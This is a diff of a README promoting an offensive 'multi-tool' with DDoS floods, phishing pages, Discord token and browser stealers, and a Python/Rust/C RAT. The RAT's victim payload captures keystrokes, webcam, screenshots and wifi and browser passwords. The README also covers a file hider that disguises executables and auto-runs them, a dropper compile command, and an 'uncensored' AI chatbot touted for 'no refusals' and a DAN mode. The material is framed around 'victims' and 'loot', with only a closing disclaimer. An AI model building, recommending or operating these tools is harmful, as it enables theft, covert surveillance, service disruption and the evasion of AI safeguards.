@@ -1,211 +1,262 @@
+<div align="center">
 
+```
+ ░█████╗░██╗░░░░░██╗░░░░░  ██╗███╗░░██╗  ░█████╗░███╗░░██╗███████╗
+ ██╔══██╗██║░░░░░██║░░░░░  ██║████╗░██║  ██╔══██╗████╗░██║██╔════╝
+ ███████║██║░░░░░██║░░░░░  ██║██╔██╗██║  ██║░░██║██╔██╗██║█████╗░░
+ ██╔══██║██║░░░░░██║░░░░░  ██║██║╚████║  ██║░░██║██║╚████║██╔══╝░░
+ ██║░░██║███████╗███████╗  ██║██║░╚███║  ╚█████╔╝██║░╚███║███████╗
+ ╚═╝░░╚═╝╚══════╝╚══════╝  ╚═╝╚═╝░░╚══╝  ╚════╝░╚═╝░░╚══╝╚══════╝
+```
 
-**All-in-one offensive security toolkit**
+<h3>v5 · by camzzz · Python + Rust + C</h3>
 
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue?logo=python&logoColor=white)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20Termux-brightgreen)
-![Language](https://img.shields.io/badge/Also%20in-Rust%20%7C%20C-orange)
-![License](https://img.shields.io/badge/Use-Authorized%20Pentest%20%2F%20CTF%20only-red)
+[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=flat-square&logo=python&logoColor=white)](https://python.org)
+[![Platform](https://img.shields.io/badge/Platform-Windows%20·%20Linux%20·%20Termux-2ea44f?style=flat-square)](.)
+[![Languages](https://img.shields.io/badge/Also%20in-Rust%20·%20C-orange?style=flat-square)](.)
+[![Use](https://img.shields.io/badge/Use-CTF%20·%20Pentest%20·%20Research-red?style=flat-square)](.)
+
+> **40+ modules** · Arrow-key UI · DDoS engine · RAT system · AI chatbot · Phishing · OSINT · File hider
 
 </div>
 
 ---
 
-## What's inside
+## Contents
 
-| File | Description |
-|------|-------------|
-| `multi-tool.py` | Main toolkit — 40+ modules, arrow-key UI |
-| `rat/builder.py` | Payload builder — generates victim file |
-| `rat/c2/server.py` | C2 server — receives loot from victims |
-| `rat/rat.rs` | Rust RAT — TCP reverse shell, menu-driven |
-| `rat/dropper.c` | C dropper — standalone Windows .exe |
-| `requirements.txt` | Python dependencies |
-| `requirements-termux.txt` | Termux-compatible subset |
-| `install.bat` | One-click installer (Windows) |
+- [Install](#install)
+- [Navigation](#navigation)
+- [Modules](#modules)
+- [DDoS Engine](#ddos-engine)
+- [RAT System](#rat-system)
+- [AI Chatbot](#ai-chatbot)
+- [File Hider](#file-hider)
 
 ---
 
-## Quick start
+## Install
 
-### Windows
+<details>
+<summary><b>Windows</b></summary>
+
 ```bat
-git clone https://github.com/cameleonnbss/camzzz-multitool
-cd camzzz-multitool
+git clone https://github.com/cameleonnbss/all-in-one-multi-tool
+cd all-in-one-multi-tool
 install.bat
 python multi-tool.py
 ```
+</details>
 
-### Linux
+<details>
+<summary><b>Linux / Kali / Parrot</b></summary>
+
 ```bash
-git clone https://github.com/cameleonnbss/camzzz-multitool
-cd camzzz-multitool
+git clone https://github.com/cameleonnbss/all-in-one-multi-tool
+cd all-in-one-multi-tool
 pip install -r requirements.txt
 python3 multi-tool.py
 ```
+</details>
 
-### Termux (Android)
+<details>
+<summary><b>Termux (Android)</b></summary>
+
 ```bash
 pkg update && pkg upgrade -y
 pkg install python git clang libffi openssl libjpeg-turbo -y
-git clone https://github.com/cameleonnbss/camzzz-multitool
-cd camzzz-multitool
+git clone https://github.com/cameleonnbss/all-in-one-multi-tool
+cd all-in-one-multi-tool
 pip install -r requirements-termux.txt
-python multi-tool.py
+python3 multi-tool.py
 ```
+</details>
 
 ---
 
 ## Navigation
 
-The main tool has a **violet arrow-key UI**:
+The main UI uses **animated arrow-key navigation** — works on Windows, Linux and Termux.
 
 | Key | Action |
 |-----|--------|
-| `↑` `↓` | Move in column |
+| `↑` `↓` | Move up / down |
 | `←` `→` | Switch column |
 | `Enter` | Launch module |
-| `M` | Text menu (fallback) |
+| `M` | Text menu fallback |
 | `Q` | Quit |
 
 ---
 
 ## Modules
 
-### Attack
-| Module | Description |
-|--------|-------------|
-| **DDoS Flood** | 11 vectors — UDP, SYN, HTTP, Slowloris, POST, ICMP, HULK, R.U.D.Y, SSL. Mode `[E]` ULTRA launches all at max threads |
-| Steam Phish | Steam login phishing page |
-| Discord Steal | Token + cookie stealer |
-| **Discord RAT** | Python bot RAT / Rust TCP RAT / Simple dropper |
-| Brute Force | SSH, FTP, RDP, HTTP |
-| Payload Gen | Reverse shells, MSFvenom |
+### ⚔️ Attack
 
-### OSINT
-| Module | Description |
+| Module | What it does |
 |--------|-------------|
-| **OSINT Pro** | Email, username, domain, Shodan, breaches |
-| Phone Lookup | Carrier, country, timezone |
-| Pub Cameras | Open RTSP feeds |
-| Paste Search | Pastebin / ghostbin |
-| ASN Lookup | BGP, IP ranges |
-| Wayback | Wayback Machine |
+| **DDoS Flood** | 11 vectors simultaneously — see [DDoS Engine](#ddos-engine) |
+| Steam Phish | Cloned Steam login page |
+| Discord Steal | Token + cookie + browser stealer |
+| **RAT** | Python / Rust / C — see [RAT System](#rat-system) |
+| Brute Force | SSH · FTP · RDP · HTTP |
+| Payload Gen | 14 reverse shell types + MSFvenom |
 
-### Web
-| Module | Description |
-|--------|-------------|
-| XSS Injector | 20 payloads, GET + POST |
-| SQL Injector | Error-based, boolean |
-| Vuln Scanner | XSS, SQLi, IDOR, SSRF, LFI, CMDi, SSTI, headers |
-| Web Hacking | Crawler, forms, JS secrets |
-| SSRF Scanner | Internal redirect, cloud metadata |
-| XXE Inject | XML external entity |
+### 🔍 OSINT
 
-### Network
-| Module | Description |
+| Module | What it does |
 |--------|-------------|
-| Port Scanner | TCP connect, service detection |
-| DNS Enum | A, MX, NS, TXT, AXFR |
-| WiFi Tools | Scanner, deauth, WPS, MAC |
+| **OSINT Pro** | Email · username · domain · Shodan · breaches · Gravatar |
+| Phone Lookup | Carrier · country · timezone · OSINT links |
+| Pub Cameras | Open RTSP / MJPEG feeds |
+| Paste Search | Pastebin · Ghostbin · Rentry |
+| ASN Lookup | BGP · IP ranges · routing |
+| Wayback | Archive snapshots |
+
+### 🌐 Web
+
+| Module | What it does |
+|--------|-------------|
+| XSS Injector | 20 payloads · GET + POST |
+| SQL Injector | Error-based · boolean-based |
+| **Vuln Scanner** | XSS · SQLi · IDOR · SSRF · LFI · CMDi · SSTI · headers · cookies |
+| Web Hacking | Crawler · forms · JS secrets · API endpoints |
+| SSRF Scanner | Internal redirect · AWS metadata |
+| XXE Inject | XML external entity payloads |
+
+### 📡 Network
+
+| Module | What it does |
+|--------|-------------|
+| Port Scanner | TCP connect · service detection |
+| DNS Enum | A · MX · NS · TXT · AXFR |
+| WiFi Tools | Scanner · deauth · WPS · MAC changer |
 | Packet Sniff | Live capture |
-| ARP Spoofer | MITM |
-| SSL Inspect | Cert info, expiry |
+| ARP Spoofer | MITM poisoning |
+| SSL Inspect | Cert · expiry · SAN |
 
-### Pentest+
-| Module | Description |
+### 🔓 Pentest+
+
+| Module | What it does |
 |--------|-------------|
-| Rev Shell | 14 shell types + TTY upgrade |
+| Rev Shell | 14 shell types + TTY upgrade guide |
 | Metasploit | Helper one-liners |
 | CVE Scanner | CVE lookup by product |
-| Wordlist Gen | Custom wordlists |
-| Sub Takeover | CNAME takeover check |
-| JWT Tool | Decode, forge, alg:none |
+| Wordlist Gen | Custom wordlists from target info |
+| Sub Takeover | CNAME takeover detection |
+| JWT Tool | Decode · forge · alg:none |
 
-### Crypto / Files
-| Module | Description |
-|--------|-------------|
-| Hash+Encode | MD5, SHA, Base64, Caesar |
-| Breach Check | HIBP, DeHashed, IntelX |
-| Hash Crack | Dictionary + rainbow |
-| Steganography | LSB hide/extract PNG |
-| File+Virus | Static AV + VirusTotal |
-| Image Meta | EXIF extractor |
+### 🔐 Crypto / Files
 
-### Recon / Extra
-| Module | Description |
+| Module | What it does |
 |--------|-------------|
-| **AI Chatbot** | OpenRouter — 10 models, Dolphin/Hermes/Nemotron, auto-fallback, DAN mode |
-| Shodan | Search + API |
-| **File Hider** | Hide any file in any carrier. Change .exe icon. Auto-extract launcher |
-| **Social Media** | TikTok info + mass reporter (12 platforms) |
-| **Phishing** | Built-in pages: Instagram, Facebook, Google, Discord, TikTok, Microsoft |
-| **Geo Photo** | EXIF GPS → coordinates + address + Maps links |
+| Hash+Encode | MD5 · SHA1/256/512 · Base64 · Caesar · ROT13 |
+| Breach Check | HIBP · DeHashed · IntelX |
+| Hash Crack | Dictionary + rainbow table |
+| Steganography | LSB hide/extract in PNG |
+| File+Virus | Static AV scan + VirusTotal |
+| Image Meta | Full EXIF extractor |
+
+### 🛠️ Recon / Extra
+
+| Module | What it does |
+|--------|-------------|
+| **AI Chatbot** | 10 models · uncensored · auto-fallback — see [AI Chatbot](#ai-chatbot) |
+| Shodan | Search + API integration |
+| **File Hider** | Hide any file in any carrier — see [File Hider](#file-hider) |
+| **Social Media** | TikTok info · mass reporter (12 platforms) · auto HTTP reports |
+| **Phishing** | Built-in: Instagram · Facebook · Google · Discord · TikTok · Microsoft |
+| **Geo Photo** | EXIF GPS → exact coords + address + Google Maps |
 
 ---
 
-## DDoS methods
+## DDoS Engine
 
-| Key | Method | Layer |
-|-----|--------|-------|
-| 1 | UDP Flood | L4 |
-| 2 | TCP SYN Flood | L4 |
-| 3 | HTTP GET Flood | L7 |
-| 4 | Slowloris | L7 |
-| 5 | HTTP POST Flood | L7 |
-| 6 | R.U.D.Y | L7 |
-| 7 | DNS Amplification | L7 |
-| 8 | ICMP Flood | L3 |
-| 9 | SSL Renegotiation | L7 |
-| B | HULK (infinite random GET) | L7 |
-| C | GET Flood Auto (timed) | L7 |
-| D | POST Flood Auto (timed) | L7 |
-| **E** | **ULTRA — all 11 at max threads** | **ALL** |
+Port is **auto-detected** from URL — `https://` → 443, `http://` → 80.
 
-Port is **auto-detected** from URL (`https://` → 443, `http://` → 80, explicit port kept).
+| Key | Method | Layer | Notes |
+|-----|--------|-------|-------|
+| `1` | UDP Flood | L4 | Raw UDP packets |
+| `2` | TCP SYN Flood | L4 | Half-open connections |
+| `3` | HTTP GET Flood | L7 | High RPS |
+| `4` | Slowloris | L7 | Low bandwidth |
+| `5` | HTTP POST Flood | L7 | Heavy body |
+| `6` | R.U.D.Y | L7 | 1 byte per 12s |
+| `7` | DNS Amplification | L7 | Resolver flood |
+| `8` | ICMP Flood | L3 | Ping 1400 bytes |
+| `9` | SSL Renegotiation | L7 | CPU exhaustion |
+| `B` | HULK | L7 | Random GET, infinite |
+| `C` | GET Flood Auto | L7 | Timed + pooled |
+| `D` | POST Flood Auto | L7 | Random JSON |
+| **`E`** | **ULTRA** | **ALL** | **All 11 vectors at max threads** |
 
 ---
 
-## RAT system
+## RAT System
 
-See [`rat/README.md`](rat/README.md) for full details.
+Three options — pick the one that fits your target:
 
-**3-step workflow:**
-1. Run `rat/c2/server.py` on your machine → get URL
-2. Run `rat/builder.py` → enter C2 URL → generates payload
-3. Victim opens payload → everything lands in `loot/<hostname>/`
+| | Simple Dropper | Rust RAT | C Dropper |
+|-|----------------|----------|-----------|
+| **Platform** | Win + Linux | Win + Linux | Windows only |
+| **Size** | 5KB py / 10MB exe | ~200KB | ~80KB |
+| **Interactive** | ✗ | ✓ menu-driven | ✗ |
+| **Deps on victim** | Python (py) / none (exe) | **Zero** | **Zero** |
+| **C2** | HTTP server | netcat | HTTP server |
 
-**What you receive:**
-- `sysinfo.txt` — OS, user, IP, admin status
-- `screenshot.png` — screen capture
-- `webcam.jpg` — webcam photo
-- `keylog.txt` — live keylog updated every 30s
-- `wifi.txt` — all wifi passwords
-- `files.txt` — Desktop/Downloads/Documents listing
-- `loot.zip` — full archive every hour
+**Simple Dropper** — victim opens file → you receive in `loot/<hostname>/`:
+- `sysinfo.txt` · `screenshot.png` · `webcam.jpg` · `keylog.txt` · `wifi.txt` · `files.txt` · `loot.zip`
+
+**Rust RAT** — menu in your terminal, type numbers:
+```
+[1] Sysinfo  [2] Screenshot  [3] Webcam  [4] Keylog 30s
+[5] Files    [6] Browse dir  [7] Download file  [8] Run cmd
+[9] Processes  [10] Kill  [11] Wifi passwords  [12] Browser passwords
+[13] Persistence  [14] Free shell  [0] Disconnect
+```
+
+**C Dropper** — ~80KB standalone `.exe`, GDI screenshot, wifi, file listing. Compile:
+```bash
+# Linux → Windows
+x86_64-w64-mingw32-gcc dropper.c -o dropper.exe -lwinhttp -lws2_32 -lgdi32 -lole32 -mwindows -O2
+```
 
 ---
 
 ## AI Chatbot
 
-Powered by [OpenRouter](https://openrouter.ai/keys) (free tier).
+Powered by [OpenRouter](https://openrouter.ai/keys) — **free tier**, no payment needed.
 
 | Model | Notes |
 |-------|-------|
 | Gemma 4 26B | Default |
-| Dolphin Venice 24B | Zero filter |
-| Hermes 3 405B | Low-refusal |
+| **Dolphin Venice 24B** | Zero filter, no refusals |
+| **Hermes 3 405B** | Low-refusal, 405B params |
 | Nemotron Ultra 253B | NVIDIA |
 | Llama 3.3 70B | Meta |
 
-In-chat: `/model` `/style` `/clear` `/history` `/save` `/exit`
+Auto-fallback — if one model fails, tries the next automatically.
+
+In-chat commands: `/model` `/style` `/clear` `/history` `/save` `/exit`
+
+---
+
+## File Hider
+
+Hide any file (`.exe`, `.py`, `.sh`, `.zip`...) inside any carrier (image, PDF, MP4...).
+
+| Option | Description |
+|--------|-------------|
+| **Hide** | Embed payload inside carrier |
+| **Extract** | Recover hidden payload |
+| **Scan** | Detect if a file has a hidden payload |
+| **Icon** | Change `.exe` icon from `.png`/`.ico` (Windows) |
+| **Launcher** | Generate `.py` that auto-extracts and runs |
 
 ---
 
 ## Disclaimer
 
-> For **authorized penetration testing, CTF competitions, and educational use only.**
-> Do not use against systems you do not own or have explicit written permission to test.
+> For **authorized penetration testing, CTF competitions, and educational use only.**  
+> Do not use against systems you do not own or have explicit written permission to test.  
 > The author is not responsible for any misuse.
 
 **By camzzz** — [github.com/cameleonnbss](https://github.com/cameleonnbss)
